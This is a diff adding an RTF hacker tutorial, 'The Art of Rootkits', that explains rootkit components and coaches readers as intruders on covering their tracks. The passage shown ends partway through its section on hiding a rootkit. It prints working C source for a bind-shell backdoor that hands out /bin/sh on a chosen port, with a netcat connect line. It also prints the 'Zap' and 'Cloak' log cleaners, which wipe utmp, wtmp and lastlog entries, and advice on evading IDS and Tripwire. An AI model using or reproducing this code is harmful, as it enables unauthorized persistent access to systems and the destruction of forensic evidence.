@@ -1,0 +1,398 @@
+{\rtf1\ansi\ansicpg1252\deff0\deflang1033{\fonttbl{\f0\froman\fcharset0 Times New Roman;}{\f1\fswiss\fcharset0 Courier New;}{\f2\fswiss\fcharset0 Arial;}{\f3\fnil\fcharset2 Symbol;}}
+{\colortbl ;\red0\green0\blue255;}
+{\*\generator Msftedit 5.41.21.2500;}\viewkind4\uc1\pard\sb100\sa100\f0\fs24 The Art of Rootkits (2nd ed) by Marcus Unknown\par
+Table of Contents\par
+\pard\li360\ri360\sb100\sa100\line{\field{\*\fldinst{HYPERLINK "\\l "1""}}{\fldrslt{\cf1\ul 01. - What is a rootkit?}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "2""}}{\fldrslt{\cf1\ul 02. - Hacker Jargon definition}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "3""}}{\fldrslt{\cf1\ul 03. - Hackers or the kids?}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "4""}}{\fldrslt{\cf1\ul 04. - Who uses rootkits and why?}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "5""}}{\fldrslt{\cf1\ul 05. - The language rootkits are coded in}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "6""}}{\fldrslt{\cf1\ul 06. - Different types of rootkits}}}\cf0\ulnone\f0\fs24\par
+{\field{\*\fldinst{HYPERLINK "\\l "7""}}{\fldrslt{\cf1\ul 07. - Backdoors}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "8""}}{\fldrslt{\cf1\ul 08. - Sniffers}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "9""}}{\fldrslt{\cf1\ul 09. - Cleaners (Log bashers)}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "10""}}{\fldrslt{\cf1\ul 10. - Rootkit extra utilities}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "11""}}{\fldrslt{\cf1\ul 11. - Kernel rootkits (more detail)}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "12""}}{\fldrslt{\cf1\ul 12. - How the kernel works}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "13""}}{\fldrslt{\cf1\ul 13. - Analyzing an Application rootkit "T0rn"}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "14""}}{\fldrslt{\cf1\ul 14. - A variety of hiding methods: Hiding a Sniffer; Hiding network connections; Hiding a backdoor}}}\cf0\ulnone\f0\fs24  \par
+{\field{\*\fldinst{HYPERLINK "\\l "15""}}{\fldrslt{\cf1\ul 15. - Recommended reading and useful links}}}\cf0\ulnone\f0\fs24\line{\field{\*\fldinst{HYPERLINK "\\l "16""}}{\fldrslt{\cf1\ul 16. - Credits}}}\cf0\ulnone\f0\fs24  \par
+\pard\sb100\sa100\line 1 - What is a root kit?\par
+A rootkit is a program. Rootkits come in all different shapes and styles, some more advance than others. Rootkits are basically programs that help attackers keep their position as root. Notice it's called a "rootkit". 'root' meaning the highest level of administration on *nix based systems and 'kit' meaning a collection of tools. Rootkits contain tools which help attackers hide their presence as well as give the attacker full control of the server or host continuously without being noticed.\par
+Rootkits are usually installed on systems when they have been successfully compromised and the highest level of access has been given (usually root) Some rootkits refuse to be installed until the attacker has root access, due to read and write permission to certain files. Once the system has been successfully compromised and the attacker has root, he\\she may then install the rootkit, allowing them to cover their tracks and wipe the log files. \par
+A typical rootkit consists of the following utilities (Note: We will look at these in a lot more detail later on):\par
+\pard{\pntext\f3\'B7\tab}{\*\pn\pnlvlblt\pnf3\pnindent360{\pntxtb\'B7}}\fi-360\li720\sb100\sa100 Backdoor Programs - login backdoors, telnetd etc \par
+{\pntext\f3\'B7\tab}Packet Sniffers - Sniff network traffic such as FTP, TELNET,POP3 \par
+{\pntext\f3\'B7\tab}Log-Wiping Utilities - Bash the logs to cover tracks \par
+{\pntext\f3\'B7\tab}DDoS Programs - Turn the box into a DDoS client (Remember trinoo?) \par
+{\pntext\f3\'B7\tab}IRC\\Bots - Bots used to take over IRC channels (Lame and annoying) \par
+{\pntext\f3\'B7\tab}Miscellaneous programs - May contain exploit, log editor \par
+\pard\sb100\sa100 (Don't worry to much if you don't understand any of the above, as I said were look at this all in a lot more detail further down)\par
+\line 2 - Hacker Jargon Definition\par
+Oh Hail the mighty hacker jargon! \par
+This is what the "Hacker Jargon" says about the word "rootkit"...\par
+\line "rootkit: /root\'b4kit/, n.\line [very common] A kit for maintaining root; an automated cracking tool. What script kiddies use. After a cracker has first broken in and gained root access, he or she will install modified binaries such as a modified version login with a backdoor, or a version of ps that will not report the cracker's processes). This is a rootkit."\par
+Wow! that's amazing! We worship you hacker jargon! Thank you ever so much for explaining to me what a rootkit is! \par
+Remember kidz, all you have to do is read out some cool urban HaX@r words out the jargon to your friends and they will think your really c00l! and 1337! ;-)\par
+\line 3 - Hackers or the Kids?\par
+Now the question you are probably asking yourself is "Is a rootkit a hackers tool or just another script kiddies tool?" (Well, you may not be thinking that, maybe I just suck and my psychology skills are as good as yours..) Well, the "Hacker Jargon" defines a rootkit and a script kiddies tool and to some extend he\\she\\they\\IT is right (The jargon is always right)\par
+Rootkits don't really require that much skill to run or use. Most rootkits can be compiled like this...\par
+gcc t0rn.c -o rootkit\par
+then...\par
+./rootkit\par
+\line (Now obviously when compiling all "hacker" tools you need to chose a name which disguises it's purpose, so rootkit would be a really stupid choice)\par
+However there are some rootkits that require more skill to run and use. Some rootkits require you to edit the source code before it's compiled and some even need you to edit the iptables and kernel. (Very advance ones, they used one at the "Black Hat Conference" in 2002)\par
+So, rootkits are used by both hackers and script kiddies. I personally believe that a hacker would have to write his own rootkit to call himself a hacker not just run and use someone else code. (However that\rquote s just my opinion, so don't hold me to that!)\par
+\line 4 - Who uses rootkits and why?\par
+I have already really covered this in the previous sections, however for the forgetful types I shall explain again, just to summaries up what we have learnt so far...\par
+Hackers and script kiddies use rootkits, they use them to maintain root and cover their tracks. Script kiddies lack knowledge of *how* a rootkit really works and most often they will end up deleting key binary files. (Basically, script kiddies will let you know when they have compromised your system)\par
+Rootkits are only installed when the system has been compromised and root has been gained.\par
+I don't really want to go into any more detail, because I'll end up just repeating myself. Lets just move on...\par
+\line 5 - The Language rootkits are coded in\par
+Hmmm, well this isn't going to be short...\line Most rootkits are coded in C or Assembly (Shell code). Most of the well-known rootkits are coded in C so the attacker can edit the source code to fit its target specification. (E.g. The logs files could be stored in a different location)\par
+\line 6 - Different types of rootkits\par
+At the current time of writing there are 2 main types of rootkits.\par
+Application rootkits - Established at the application layer\line Kernel rootkits - Established at the kernel level (Core of any OS)\par
+\line When I say "established" this could be referred to of where exactly the rootkit hides. Now lets start of my looking at an application rootkit.\par
+An application rootkit is basically a rootkit which "replaces" all the well know system binary files (ls, netstat, killall) with "fake" or "Trojanned" ones. The trojanned or fake system files will help hide the attackers presence, report false information to the system administrator and even provide a Backdoor for the attacker. To help you understand this more I have provided a list of all the typical system files, which are "replaced" to, help the attacker cover his or her tracks. The list was taken from "Rootkit: Attacker Undercover Tools" by Sailman Manap.\par
+\line LIST START....\par
+Programs replace to hide attacker presence.\par
+\pard{\pntext\f3\'B7\tab}{\*\pn\pnlvlblt\pnf3\pnindent360{\pntxtb\'B7}}\fi-360\li720\sb100\sa100 "\b ls\b0 ", "\b find\b0 ", "\b du\b0 " - Trojaned system file will be able to hide attackers file, directory and stuff that have been brought into the system from being listing. \par
+{\pntext\f3\'B7\tab}"\b ps\b0 ", "\b top\b0 ", "\b pidof\b0 " - All these programs are process monitor program. Trojaned program will hide attacker process from being listing. \par
+{\pntext\f3\'B7\tab}"\b netstat\b0 " - netstat is used to check network activity such as open port, network connections establish and listening. Trojaned netstat will hide processes installed by attacker such as ssh daemon or other services. \par
+{\pntext\f3\'B7\tab}"\b killall\b0 " - Trojaned "killall" will not be able to kill attacker process. \par
+{\pntext\f3\'B7\tab}"\b ifconfig\b0 " - When sniffer is running PROMISC flag is set to the nic. "ifconfig" is a handy utility to set and to view setting of ethernet nic. Trojaned "ifconfig" will not display the PROMISC flag when sniffer is running. This is useful to hide sniffer from being detected. \par
+{\pntext\f3\'B7\tab}"\b crontab\b0 " - Trojaned "crontab" will hide the attacker\rquote s crontab entry. \par
+{\pntext\f3\'B7\tab}"\b tcpd\b0 ", "\b syslogd\b0 " - Trojanised "tcpd" and "syslog" will not log any connection made by attacker. "tcpd" also capable to bypass tcp wrapper enforcement. \par
+\pard\sb100\sa100\line LIST END\par
+\line Hopefully, that would should have given you a better idea of what an Application is. Remember, this section has only be written so you can distinguish the differences between a "Application" rootkit and "Kernel" rootkit. Lets now take a look at a Kernel rootkit.\par
+A Kernel rootkit is a rootkit that buries itself deep in the Kernel. This makes it extremely hard to detect and remove. Kernel rootkits are more advance then Application rootkits, A Kernel rootkit works by exploiting and manipulating Kernel capabilities. Now I don't really want to go in much more detail on Kernel rootkits because they can get quite advance (Well, they ARE) were talk about them later in this file, it may also help to look at "2.7 - How the kernel works" to get a feel for these Kernel rootkits...\par
+It's now time to move on. In the next section (Section 2) We look at all the elements which make up a rootkit, such as a Backdoor, Sniffer, log basher etc Half way through section 2 we will then look at "Kernel Rootkits" in more detail.\par
+\line 7 - Backdoors\par
+Most of today\rquote s (decent) rootkits contain "Backdoors". Now you should all know what a Backdoor is but just in case you didn't I will quickly give a brief explanation of all.\par
+Backdoor - A program or script which allows an attacker to establish some form of privilege and remote communication without logging into the system. Backdoors are usually installed when the system has been successfully compromised and some form of exploit has been entailed. The advantage of installing a backdoor on a system means that the attacker doesn't have to keep using the same exploit over and over again. The disadvantage of installing a backdoor means at one point or another the system administrator will notice suspicious activity in his network traffic, if he or she were to run a port scanner such as Nmap (Coded by Fyodor http://www.insecure.org) he or she would soon uncover an open port and sooner or later remove the backdoor.\line A typical example of a Windows NT\\2000 backdoor is one entitled "Tini.exe" (Made by NTSecurity) This little program listens on port 7777 for incoming connections, once a connection has been established a remote command shell is executed for the attacker who establishes the connection. (Now as I have mentioned this t-file generally deals with *nix backdoors, so I don't really want to get side stepped talking about windows backdoors, exploits etc I thought I'd just mention tini.exe to give you a general idea of what a Backdoor consists of.\par
+Now lets talk more about *Nix backdoors. *nix backdoors come in *many* shapes and sizes. The paper by Sailman Manap gives yet another long comprehensive list of all the forms backdoors come in...\par
+LIST START\par
+\pard{\pntext\f3\'B7\tab}{\*\pn\pnlvlblt\pnf3\pnindent360{\pntxtb\'B7}}\fi-360\li720\sb100\sa100\b Login Backdoor\b0  - Modifying login.c to look for backdoor password before stored password. Attacker can log into any account using backdoor password. \par
+\b{\pntext\f3\'B7\tab}Telnetd Backdoor\b0  - Trojaned the "in.telnetd" to allow attacker gain access with backdoor password. \par
+\b{\pntext\f3\'B7\tab}Services Backdoor\b0  - Replacing and manipulate services like "ftp", "rlogin", even "inetd" as backdoor to gain access. \par
+\b{\pntext\f3\'B7\tab}Cronjob backdoor\b0  - Backdoor could also be added in "crontjob" to run on specific time for example at 12 midnight to 1 am. \par
+\b{\pntext\f3\'B7\tab}Library backdoors\b0  - Almost every UNIX and Windows system have shared libraries. Shared libraries can be backdoor to do malicious activity including giving a root or administrator access. \par
+\b{\pntext\f3\'B7\tab}Kernel backdoors\b0  - This backdoor is basically exploiting the kernel, which is core of the operating system to handle and to hide backdoor effectively \par
+\b{\pntext\f3\'B7\tab}Network traffic backdoors which typically using TCP, UDP, and ICMP\b0  - Backdoor that exploiting network traffic protocol is widely used. In TCP protocol backdoor like ssh is popularly used because it communicate in encrypt, while crafting and tunneling packet In UDP and ICMP traffic will give a better chances escaping from firewall and "netstat". \par
+\pard\sb100\sa100 LIST END\par
+\line All of these and any other forms of *nix backdoors are explained and documented by Christopher Klaus, his paper can be\line Reached at http://secinf.net/info/unix/backdoors.txt, I strongly recommend you check it out if you are either really interested in Backdoors or you still haven\rquote t grasped the basic concepts of Backdoors. I have also written a small file on Backdoors entitled "A Crash Course in Backdoors" it is available at http://www.invisibleghosts.net\par
+To finish of this section on backdoors, I feel like adding some source code. (This is a basic TCP Backdoor for *nix if you don't own a copy of linux or unix don't even attempt to compile this ;-)\line I did not write this, shaun2k2 did, so please give ALL credit for the below source code to him.\par
+----START-----------------------------\par
+\pard\tx0\tx959\tx1918\tx2877\tx3836\tx4795\tx5754\tx6713\tx7672\tx8631\f1\fs20 /* backdoor.c - basic unix tcp backdoor.\par
+ *\par
+ * This is a basic UNIX TCP backdoor.  /bin/sh is binded to the port of your\par
+ * choice.  Access the shell with telnet or netcat:\par
+ *\par
+ * root# nc -v hackedhost.com 1337\par
+ *\par
+ * I do not take responsibility for this code.\par
+ */\par
+\par
+#include \par
+#include \par
+#include \par
+#include \par
+#define BACKLOG 5\par
+#define SHELL '/bin/sh'\par
+\par
+void usage();\par
+\par
+int main(int argc, char *argv[]) \{\par
+if(argc <2) \{\par
+\tab usage(argv[0]);\par
+\}\par
+\par
+int sock, csock;\par
+struct sockaddr_in client;\par
+struct sockaddr_in mine;\par
+if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) \{\par
+printf('Couldn't make socket!\\n');\tab\tab\tab\tab\tab\tab exit(-1);\par
+\}\par
+\par
+mine.sin_family = AF_INET;\par
+mine.sin_port = htons(atoi(argv[1]));\par
+mine.sin_addr.s_addr = INADDR_ANY;\par
+if(bind(sock, (struct sockaddr *)&mine, sizeof(struct sockaddr)) == -1) \{\par
+printf('Could not bind socket!\\n');\par
+exit(-1);\par
+\}\par
+\par
+if(listen(sock, BACKLOG) == -1) \{\par
+printf('Could not listen on socket!\\n');\par
+exit(-1);\par
+\}\par
+\par
+printf('Listening for connections on port %s!\\n', argv[1]);\par
+\par
+while(1) \{\par
+\tab int sin_size;\par
+\tab sin_size = sizeof(struct sockaddr);\par
+\tab csock = accept(sock, (struct sockaddr *)&client, &sin_size);\par
+\tab dup2(csock, 0);\par
+\tab dup2(csock, 1);\par
+\tab dup2(csock, 2);\par
+\tab execl('/bin/sh','/bin/sh',(char *)0);\par
+\tab close(csock);\par
+\} \par
+\}\par
+\par
+void usage(char *progname[]) \{\par
+\tab printf('Usage: %s \\n', progname);\par
+\tab exit(-1);\par
+\}\par
+\pard\sb100\sa100\f0\fs24 -------END---------------------------------------\par
+The main purpose of me showing you this source is to give you a general idea of what a rootkit consists of. Remember rootkits come in many shapes and sizes and every rootkit is most likely to contain some form of Backdoor...\par
+So what else do rootkits contain apart from Backdoors? Lets move on to the next section and look at "Sniffers".\par
+\line 8 - Sniffers\par
+A lot of today\rquote s rootkits contain programs known as "Sniffers". What are Sniffers? (Also known as Packet Sniffers)\line Basically packet Sniffers are programs that are made to "Monitor" network traffic, TCP\\IP or any other network device. I'm sure you know when you are browsing the Internet or playing online games "Packets" of data are going to and from your Computer. Attackers install Sniffers so they can capture valuable information which is floating to and from your computer. \par
+What type of valuable information?\line Here is a list of what a Sniffer is capable of...\par
+\pard{\pntext\f3\'B7\tab}{\*\pn\pnlvlblt\pnf3\pnindent360{\pntxtb\'B7}}\fi-360\li720\sb100\sa100 Sniffing FTP passwords \par
+{\pntext\f3\'B7\tab}Sniffing Telnet passwords \par
+{\pntext\f3\'B7\tab}Sniffing Network passwords \par
+{\pntext\f3\'B7\tab}Sniffing POP3 passwords \par
+{\pntext\f3\'B7\tab}Capturing websites you have visited \par
+{\pntext\f3\'B7\tab}Sniffing Gateways \par
+{\pntext\f3\'B7\tab}Lots more \par
+\pard\sb100\sa100 Some of you may be thinking "Won't my passwords been encrypted as they are passing over my network?" To some extent this is true, some services provide encryption (Such as E-mail if you were using PGP sniffing would be useless, unless of course your a good cryptographer)\line Other services such as ftp and telnet transfer their passwords in plain text, so it would be easy for an attacker to just capture the packet then dump it into a text editor (such as "vi", "Pico" or for M$ notepad) it would only take a couple of minutes for an attacker to uncover the plain text password.\par
+Now there is a technical side to Sniffers that I don't really want to go into. For more information on Sniffers please read http://www.sans.org/infosecFAQ/switchednet/sniffers.htm this paper was written by a "Jason Drury" and I have found it most useful. If you are more interested in Windows Sniffers then I can recommend getting a copy of the following....\par
+\pard{\pntext\f3\'B7\tab}{\*\pn\pnlvlblt\pnf3\pnindent360{\pntxtb\'B7}}\fi-360\li720\sb100\sa100 Windows Sniffer \par
+{\pntext\f3\'B7\tab}TcpDump \par
+{\pntext\f3\'B7\tab}Password Capture --------> Made especially to sniff passwords \par
+{\pntext\f3\'B7\tab}Sniff \par
+{\pntext\f3\'B7\tab}Ethereal \par
+{\pntext\f3\'B7\tab}EtherPeep \par
+\pard\sb100\sa100 My personal favorite Sniffer for Windows has to be TCPDump it's command line driven so the scripties wouldn't go near it but for those truly interested in the elements of computer hacking I would recommend TCPDump, it will take time getting used to it but its worth it.\par
+Now what about linux sniffers.. Hmmmm I'll be honest with you I haven\rquote t had much experience using linux Sniffers, but I have been told there are some good tutorials on how to make your own Sniffer for *nix on http://www.planetsourcecode.com, however before you even attempt to make your own I strongly recommend you get into socket programming. If you want a read made Sniffer just google for one, a common one is "linsniffer.c" \par
+Anyway back to the main point, most rootkits DO sometimes contain "ready to run" Sniffers and Sniffers are hard to detect once they are running. (Were look at this a little later) The purpose of this section was just to show you WHAT a Sniffer is.. Now you know lets move on :-)\par
+\line 9 - Cleaners (Log Bashers)\par
+Ah, we come to something a lot simpler, Log Bashers :-) (Also known as Log deleters, Log killers and Log Cleaners)\par
+No matter what the title they all do the same thing. Delete system log files. System Administrators rely on logging as an extra form of security. Log files can keep track on who logged in last and at what type, what programs were run as that user was logged in etc etc. Therefore it is exceptionally important for the attacker to destroy ALL traces of log files. Now, some of you may be thinking:\par
+"If all the Log files are deleted won't this give an indication to the system administrator that there box has been hacked?"\par
+If you\rquote re thinking that, then your dead right. Deleting the log files can sometimes be pretty stupid, the best way to get around the log files is to "edit" the entries by deleting your entries and filling in some false ones (Sometimes this requires root access, but if your running a log cleaner of a rootkit you should already have root :-)\par
+Another way around this is to delete the whole log file then to "re-create" them. Here is a VERY simple script I made to demonstrate what I mean...\par
+\line -------START------\par
+int main()\line system("rm-rf /root/logs/LastEntry.log");\line touch(" /root/Logs/LastEntry.log");\line return 0;\par
+-------END--------\par
+Now for those who don't know any C then I shall I explain. The first main line of the code is telling the C program to remove the file LastEntry.log, delete it. The second line is telling the program to create a file called LastEntry.log in the exact same location.\line So when the system administrator opens the log file he will be confronted with a blank file. (This may be a bit stupid because if the admin is security minded he will know the system has been compromised. Some stupid admins see it as a 'Bug' therefore you get away with it.)\par
+Most rootkits contain some form of log-cleaner, but before you execute it you need to make sure you know exactly HOW it works, otherwise your just another script kiddie who "presumes" this tool will cover your tracks completely. Some log cleaners search certain directories for words like "IP" "Login", "Logs", "Log" etc and then delete them. Some just delete all the default log files that are in the default system location. Before you compile a rootkit learn C and take a look at the source code you may find you need to edit some of the entries. It's important you come FULLY prepared before you go out and install your rootkit.\par
+I'll tell you now, I have been in this game long enough to realize even if you successfully edit\\Delete a bunch of log files it doesn't mean you\rquote re untraceable. You still need to think about system programs which are running, which may have their own logging capabilities. Look out for IDS (Intrusion Detection Systems) such as SNORT and look out for programs like Tripwire and any other security programs which \line monitor\\analyze system security.\par
+As more and more people become security minded so do there software and "security awareness" system administrators are getting clever, so be careful!\par
+I'll end this section now with some source for some well known log cleaners, I would strongly recommend not using them though, since they are fairly old. I'm only using them to show you what typical log cleaners are (used to be) like. Just because they are old though doesn't mean they don't work ;-) I'm just pretty sure if you Google about you can find MUCH better ones.\par
+\line This is a very old log cleaner called "Zap" the source code is below..\par
+----START----\par
+\pard\tx0\tx959\tx1918\tx2877\tx3836\tx4795\tx5754\tx6713\tx7672\tx8631\f1\fs20 #include \par
+#include \par
+#include \par
+#include \par
+#include \par
+#include \par
+#include \par
+#include \par
+#define WTMP_NAME '/usr/adm/wtmp'\par
+#define UTMP_NAME '/etc/utmp'\par
+#define LASTLOG_NAME '/usr/adm/lastlog'\par
+ \par
+int f;\par
+ \par
+void kill_utmp(who)\par
+char *who;\par
+\{\par
+    struct utmp utmp_ent;\par
+ \par
+  if ((f=open(UTMP_NAME,O_RDWR))>=0) \{\par
+     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )\par
+       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) \{\par
+                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));\par
+                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);\par
+                 write (f, &utmp_ent, sizeof (utmp_ent));\par
+            \}\par
+     close(f);\par
+  \}\par
+\}\par
+ \par
+void kill_wtmp(who)\par
+char *who;\par
+\{\par
+    struct utmp utmp_ent;\par
+    long pos;\par
+ \par
+    pos = 1L;\par
+    if ((f=open(WTMP_NAME,O_RDWR))>=0) \{\par
+ \par
+     while(pos != -1L) \{\par
+        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);\par
+        if (read (f, &utmp_ent, sizeof (struct utmp))<0) \{\par
+          pos = -1L;\par
+        \} else \{\par
+          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) \{\par
+               bzero((char *)&utmp_ent,sizeof(struct utmp ));\par
+               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);\par
+               write (f, &utmp_ent, sizeof (utmp_ent));\par
+               pos = -1L;\par
+          \} else pos += 1L;\par
+        \}\par
+     \}\par
+     close(f);\par
+  \}\par
+\}\par
+ \par
+void kill_lastlog(who)\par
+char *who;\par
+\{\par
+    struct passwd *pwd;\par
+    struct lastlog newll;\par
+ \par
+     if ((pwd=getpwnam(who))!=NULL) \{\par
+ \par
+        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) \{\par
+            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);\par
+            bzero((char *)&newll,sizeof( newll ));\par
+            write(f, (char *)&newll, sizeof( newll ));\par
+            close(f);\par
+        \}\par
+ \par
+    \} else printf('%s: ?\\n',who);\par
+\}\par
+ \par
+main(argc,argv)\par
+int argc;\par
+char *argv[];\par
+\{\par
+    if (argc==2) \{\par
+        kill_lastlog(argv[1]);\par
+        kill_wtmp(argv[1]);\par
+        kill_utmp(argv[1]);\par
+        printf('Zap2!\\n');\par
+    \} else\par
+    printf('Error.\\n');\par
+ \par
+\pard\sb100\sa100\f0\fs24\line ----END----\par
+Here is another little log cleaner called Cloak v1.0 it wipes your presence on SCO, BSD, Ultrix, and HP/UX UNIX. This program is *old* and was written by Wintermute of -Resist-.\par
+\line -------START-------\par
+\pard\tx0\tx959\tx1918\tx2877\tx3836\tx4795\tx5754\tx6713\tx7672\tx8631\f1\fs20 /* UNIX Cloak v1.0 (alpha)  Written by: Wintermute of -Resist- */\par
+/* This file totally wipes all presence of you on a UNIX system*/\par
+/* It works on SCO, BSD, Ultrix, HP/UX, and anything else that */\par
+/* is compatible..  This file is for information purposes ONLY!*/\par
+\par
+/*--> Begin source...    */\par
+#include \par
+#include \par
+#include \par
+#include \par
+#include \par
+\par
+main(argc, argv)\par
+    int     argc;\par
+    char    *argv[];\par
+\{\par
+    char    *name;\par
+    struct utmp u;\par
+    struct lastlog l;\par
+    int     fd;\par
+    int     i = 0;\par
+    int     done = 0;\par
+    int     size;\par
+\par
+    if (argc != 1) \{\par
+         if (argc >= 1 && strcmp(argv[1], 'cloakme') == 0) \{\par
+\tab      printf('You are now cloaked\\n');\par
+\tab      goto start;\par
+                                                           \}\par
+         else \{\par
+\tab       printf('close successful\\n');\par
+\tab       exit(0);\par
+\tab       \}\par
+\tab\tab    \}\par
+    else \{\par
+\tab  printf('usage: close [file to close]\\n');\par
+\tab  exit(1);\par
+\tab  \}\par
+start:\par
+    name = (char *)(ttyname(0)+5);\par
+    size = sizeof(struct utmp);\par
+\par
+    fd = open('/etc/utmp', O_RDWR);\par
+    if (fd < 0)\par
+\tab perror('/etc/utmp');\par
+    else \{\par
+\tab while ((read(fd, &u, size) == size) && !done) \{\par
+\tab     if (!strcmp(u.ut_line, name)) \{\par
+\tab\tab done = 1;\par
+\tab\tab memset(&u, 0, size);\par
+\tab\tab lseek(fd, -1*size, SEEK_CUR);\par
+\tab\tab write(fd, &u, size);\par
+\tab\tab close(fd);\par
+\tab     \}\par
+\tab\}\par
+    \}\par
+\par
+\par
+    size = sizeof(struct lastlog);\par
+    fd = open('/var/adm/lastlog', O_RDWR);\par
+    if (fd < 0)\par
+\tab perror('/var/adm/lastlog');\par
+    else \{\par
+\tab lseek(fd, size*getuid(), SEEK_SET);\par
+\tab read(fd, &l, size);\par
+\tab l.ll_time = 0;\par
+\tab strncpy(l.ll_line, 'ttyq2 ', 5);\par
+\tab gethostname(l.ll_host, 16);\par
+\tab lseek(fd, size*getuid(), SEEK_SET);\par
+\tab close(fd);\par
+    \}\par
+\}\par
+\pard\sb100\sa100\f0\fs24 -----END-----\par
+\line 10 - Rootkit Extra Utilities\par
+I will try and keep this section short due to there isn't really that much to say. As you should know by now and as I have mentioned rootkits come in all shapes and styles. Some rootkits are well known for their advance log cleaner, others for their advance Backdoor and others for their advance, stealth hard to remove installation procedure.\line There are some rootkits which are well known for being SAR (Swiss Army Rootkits) basically, they are rootkits with average features plus a whole load of extra utilities such as Bots, DdoS, Extra scripts, Password crackers, Killer scripts etc\par
+Rootkits that contain scripts that cause DDoS attacks are considered dangerous; if an attacker were to exploit 100's of servers and install such a rootkit those servers would then become "Zombies" they could launch DDoS attacks (SYN, PING, FINGER, UDP, TCP) against chosen targets. Rootkits are continuously being made more advance and extra utilities are being added on each time. In the future I personal predict that rootkits will be a major threat to national security.......\par
+That\rquote s really all I have to say for this section. Lets move on.\par
+\line 11 - Kernel Rootkits (More Detail)\par
+We have already briefly looked at "Kernel Rootkits" but we haven\rquote t really looked at them in close detail. In this section I plan to analyze and expose the basics of a kernel rootkit. If you\rquote re not to sure on what the "Kernel" is I recommend you skip this section and move onto the next section (2.5) then come back to this section when you feel that you are ready.\par
+The best way to start of this section is talk about how Kernel rootkits actually work. Kernel rootkits work, basically by exploiting LKM. (Loadable Kernel Modules)LKM are used to load device drivers on a "as-needed" bases. LKM are usually only exploited so the attacker can perform malicious activity.\par
+Kernel rootkits are way more dangerous than Application rootkits because instead of just replacing the basic binaries like "ls" and "netstat" they attack the kernel directly and manipulate system-calls like open() and read(). As we know application rootkits replace binaries, if the administrator was clever and analyzed the actual binaries which had been replaced they will realize the differences in size (e.g. the program could contain an extra 128 bytes) However, this wouldn't be possible with Kernel rootkits because instead of actually changing the size and structure of the program, they just change the way the program operates. For example programs like "ps" use an open system call "open()" and reads information from files in the directory /proc, where also the information about running processes is kept. \par
+For more information on rootkits and to mess about with typical examples of each rootkit type...\line Considering obtaining a copy of..\par
+Application rootkit - t0rn\line Kernel rootkit - Adore (Also known as LKM-Adore)\par
+\line 12 - How the Kernel Works\par
+This will be a very basic and very short section and is only here to help those understand how the Kernel works. \line What is a Kernel? In English and using non-technical jargon a Kernel is basically the "Core" of the OS (Linux, Unix, Windows). Without the Kernel an Operating System could not load.\par
+The Kernel is one of the first things which load in a OS and it remains in the main memory. Since it's staying in the main memory its *very* important for the Kernel to be as small as possible, but at the same time be able to provide all the essential programs, services, devices, applications and drivers for the OS.\line Typically, the kernel is responsible for I/O(Input and Output) management, Device drivers, CPU management, process and task management, and disk management.\par
+The kernel looks something like this....\par
+\pard\tx0\tx959\tx1918\tx2877\tx3836\tx4795\tx5754\tx6713\tx7672\tx8631\f1\fs20 |------------------\par
+|Applications and |        - LKM - System Calls\par
+|_Programs_ _ _ _ |\par
+*******************\par
+*  MAIN KERNEL    *        - Consists of:  Memory Management\par
+*                 *                        I\\O Management\par
+*******************                        CPU Management\par
+|    Hardware      |                       Device Drivers\par
+|_ _ _ _ _ _ _ _ _ |\par
+\pard\sb100\sa100\f0\fs24\line Understand? Quite simple really...\par
+\line 13 - Analyzing an Application Rootkit "T0rnkit"\par
+This is a professional analysis of the rootkit "T0rn" this was taken of off Mcaffe's main site.\par
+\line "T0rnkit attempts to hide its presence when installed. During installation it first shuts down the system-logging daemon, syslogd. It then replaces several other system executables with trojanized versions and adds a trojanized ssh daemon to the system as well. Programs that are replaced are, among others; du, find, ifconfig, login, ls, netstat, ps, sz and top. If the system administrator uses these somewhat vital functions they report normal looking information, but the processes and network connections that the hacker uses aren't shown. Finally T0rnkit starts a Sniffer in background, enables telnetd, rsh and finger daemons in "/etc/inetd.conf", restarts inetd to activate changes made and starts syslogd again. This all without the system administrator knowing about it. \line Noteworthy is that all new programs in the t0rnkit all have the exact size of 31.336 bytes. T0rnkit usually can be found in the directory /usr/src/.puta, but of course not if it already has been activated because the command 'ls' will have been replaced. With the standard installation of t0rnkit TCP port 47017 is open for root access to the system. A modified version of this rootkit was also distributed by a variant of Unix/Lion worm.\par
+A system administrator that is a little bit into the security world can find a with t0rnkit infected system pretty fast because of the change in file sizes and a simple port scan will reveal the open port, but funny enough most people don't have this 'expertise' "\par
+\line 14 - A variety of hiding methods\par
+To finish off section two, I will give you some tips that I have found to be useful when hiding certain features of a rootkit e.g. Backdoor, Sniffer etc)\par
+Lets start by reviewing ways to successfully hide the actual rootkit...\par
+To start off with, it would be a good idea to hide the compiled rootkit in a hidden directory. I would recommend creating a directory you suspect the administrator will not go near. For example try hiding it in a folder situated in /var/something/something/something make it as long as possible and rename the file using the "mv" command to something the admin will not suspect is a "suspicious" file (e.g. Kernel-023, pso, ls2 etc)\par
